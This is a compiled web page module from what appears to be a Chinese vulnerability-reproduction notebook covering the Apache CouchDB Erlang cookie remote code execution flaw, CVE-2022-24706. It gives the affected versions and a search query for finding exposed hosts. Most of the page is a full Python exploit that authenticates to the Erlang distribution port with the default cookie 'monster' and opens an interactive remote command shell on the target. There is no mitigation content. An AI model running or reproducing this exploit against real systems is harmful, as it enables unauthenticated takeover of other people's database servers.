import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache CouchDB 是一个开源的无缝多主同步数据库，使用直观的HTTP/JSON API，并为可靠性而设计。</p><p>4月26日，Apache发布安全公告，公开了Apache CouchDB中的一个远程代码执行漏洞（CVE-2022-24706）。在3.2.2 版本之前的 Apache CouchDB 中，可以在不进行身份验证的情况下访问不正确的默认安装并获得管理员权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CouchDB &lt;= 3.2.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>port=&quot;4369&quot; &amp;&amp; &quot;couchdb&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>主页面， 默认端口为 5984</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205171709382.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用POC验证</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205171709950.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Exploit Title: Apache CouchDB 3.2.1 - Remote Code Execution (RCE)</span>
<span class="token comment"># Date: 2022-01-21</span>
<span class="token comment"># Exploit Author: Konstantin Burov, @_sadshade</span>
<span class="token comment"># Software Link: https://couchdb.apache.org/</span>
<span class="token comment"># Version: 3.2.1 and below</span>
<span class="token comment"># Tested on: Kali 2021.2</span>
<span class="token comment"># Based on 1F98D&#39;s Erlang Cookie - Remote Code Execution</span>
<span class="token comment"># Shodan: port:4369 &quot;name couchdb at&quot;</span>
<span class="token comment"># CVE: CVE-2022-24706</span>
<span class="token comment"># References:</span>
<span class="token comment">#  https://habr.com/ru/post/661195/</span>
<span class="token comment">#  https://www.exploit-db.com/exploits/49418</span>
<span class="token comment">#  https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/</span>
<span class="token comment">#  https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce</span>
<span class="token comment"># </span>
<span class="token comment">#</span>
<span class="token comment">#!/usr/local/bin/python3</span>

<span class="token keyword">import</span> socket
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
<span class="token keyword">import</span> struct
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time

TARGET <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
EPMD_PORT <span class="token operator">=</span> <span class="token number">4369</span> <span class="token comment"># Default Erlang distributed port</span>
COOKIE <span class="token operator">=</span> <span class="token string">&quot;monster&quot;</span> <span class="token comment"># Default Erlang cookie for CouchDB </span>
ERLNAG_PORT <span class="token operator">=</span> <span class="token number">0</span>
EPM_NAME_CMD <span class="token operator">=</span> <span class="token string">b&quot;\\x00\\x01\\x6e&quot;</span> <span class="token comment"># Request for nodes list</span>

<span class="token comment"># Some data:</span>
NAME_MSG  <span class="token operator">=</span> <span class="token string">b&quot;\\x00\\x15n\\x00\\x07\\x00\\x03\\x49\\x9cAAAAAA@AAAAAAA&quot;</span>
CHALLENGE_REPLY <span class="token operator">=</span> <span class="token string">b&quot;\\x00\\x15r\\x01\\x02\\x03\\x04&quot;</span>
CTRL_DATA  <span class="token operator">=</span> <span class="token string">b&quot;\\x83h\\x04a\\x06gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03&quot;</span>
CTRL_DATA <span class="token operator">+=</span> <span class="token string">b&quot;\\x00\\x00\\x00\\x00\\x00w\\x00w\\x03rex&quot;</span>


<span class="token keyword">def</span> <span class="token function">compile_cmd</span><span class="token punctuation">(</span>CMD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    MSG  <span class="token operator">=</span> <span class="token string">b&quot;\\x83h\\x02gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00&quot;</span>
    MSG <span class="token operator">+=</span> <span class="token string">b&quot;\\x00\\x00h\\x05w\\x04callw\\x02osw\\x03cmdl\\x00\\x00\\x00\\x01k&quot;</span>
    MSG <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>CMD<span class="token punctuation">)</span><span class="token punctuation">)</span>
    MSG <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>CMD<span class="token punctuation">,</span> <span class="token string">&#39;ascii&#39;</span><span class="token punctuation">)</span>
    MSG <span class="token operator">+=</span> <span class="token string">b&#39;jw\\x04user&#39;</span>
    PAYLOAD <span class="token operator">=</span> <span class="token string">b&#39;\\x70&#39;</span> <span class="token operator">+</span> CTRL_DATA <span class="token operator">+</span> MSG
    PAYLOAD <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&#39;!I&#39;</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>PAYLOAD<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> PAYLOAD
    <span class="token keyword">return</span> PAYLOAD

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Remote Command Execution via Erlang Distribution Protocol.\\n&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token keyword">not</span> TARGET<span class="token punctuation">:</span>
    TARGET <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;Enter target host:\\n&gt; &quot;</span><span class="token punctuation">)</span>

<span class="token comment"># Connect to EPMD:</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    epm_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    epm_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>TARGET<span class="token punctuation">,</span> EPMD_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Couldnt connect to EPMD: %s\\n terminating program&quot;</span> <span class="token operator">%</span> msg<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
epm_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>EPM_NAME_CMD<span class="token punctuation">)</span> <span class="token comment">#request Erlang nodes</span>
<span class="token keyword">if</span> epm_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b&#39;\\x00\\x00\\x11\\x11&#39;</span><span class="token punctuation">:</span> <span class="token comment"># OK</span>
    data <span class="token operator">=</span> epm_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;ascii&#39;</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        choise <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Found &quot;</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\nMore than one node found, choose which one to use:&quot;</span><span class="token punctuation">)</span>
        line_number <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            line_number <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot; %d) %s&quot;</span> <span class="token operator">%</span><span class="token punctuation">(</span>line_number<span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">)</span>
        choise <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&gt; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
    ERLNAG_PORT <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&quot;\\d+$&quot;</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span>choise <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Node list request error, exiting&quot;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
epm_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Connect to Erlang port:</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>TARGET<span class="token punctuation">,</span> ERLNAG_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Couldnt connect to Erlang server: %s\\n terminating program&quot;</span> <span class="token operator">%</span> msg<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
   
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>NAME_MSG<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                    <span class="token comment"># Receive &quot;ok&quot; message</span>
challenge <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>     <span class="token comment"># Receive &quot;challenge&quot; message</span>
challenge <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;&gt;I&quot;</span><span class="token punctuation">,</span> challenge<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment">#print(&quot;Extracted challenge: {}&quot;.format(challenge))</span>

<span class="token comment"># Add Challenge Digest</span>
CHALLENGE_REPLY <span class="token operator">+=</span> md5<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>COOKIE<span class="token punctuation">,</span> <span class="token string">&quot;ascii&quot;</span><span class="token punctuation">)</span>
    <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>challenge<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;ascii&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>CHALLENGE_REPLY<span class="token punctuation">)</span>
CHALLENGE_RESPONSE <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>CHALLENGE_RESPONSE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Authentication failed, exiting&quot;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Authentication successful&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Enter command:\\n&quot;</span><span class="token punctuation">)</span>

data_size <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> data_size <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        CMD <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> CMD<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">elif</span> CMD <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>compile_cmd<span class="token punctuation">(</span>CMD<span class="token punctuation">)</span><span class="token punctuation">)</span>
        data_size <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;&gt;I&quot;</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment"># Get data size</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span>              <span class="token comment"># Control message</span>
        data_size <span class="token operator">-=</span> <span class="token number">45</span>         <span class="token comment"># Data size without control message</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> data_size <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">:</span>        
        data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>data_size<span class="token punctuation">)</span>
        <span class="token comment">#print(&quot;S---data_size: %d, data_recv_size: %d&quot; %(data_size,len(data)))</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        data_size <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>        
        data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token comment">#print(&quot;L---data_size: %d, data_recv_size: %d&quot; %(data_size,len(data)))</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
        data_size <span class="token operator">-=</span> <span class="token number">1024</span>
            
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14),o=[e];function c(i,l){return s(),a("div",null,o)}const k=n(p,[["render",c],["__file","Apache CouchDB epmd 远程命令执行漏洞 CVE-2022-24706.html.vue"]]);export{k as default};
